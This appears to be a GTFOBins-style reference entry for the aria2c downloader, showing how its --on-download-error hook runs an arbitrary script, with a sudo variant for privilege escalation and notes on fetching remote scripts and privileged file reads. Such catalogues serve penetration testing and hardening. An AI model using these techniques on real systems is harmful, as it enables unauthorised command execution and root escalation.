description: Note that the subprocess is immediately sent to the background.

command.code:
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x

command.description: The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.

file-download.description: Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.

sudo.code:
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x

suid.description: It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
